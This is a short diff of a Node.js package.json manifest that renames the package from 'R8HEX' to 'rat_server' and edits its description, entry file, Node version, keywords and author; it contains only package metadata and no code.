@@ -1,16 +1,16 @@
 {
-  "name": "R8HEX",
+  "name": "rat_server",
   "version": "1.0.0",
-  "description": "its a Free Version",
-  "main": "server.js",
+  "description": "",
+  "main": "index.js",
   "engines": {
-    "node": ">=18"
+    "node": "16.13.2"
   },
   "scripts": {
     "start": "node server.js"
   },
-  "keywords": ["Testing"],
-  "author": "@A1BUG",
+  "keywords": [],
+  "author": "l",
   "license": "ISC",
   "dependencies": {
     "body-parser": "^1.19.1",
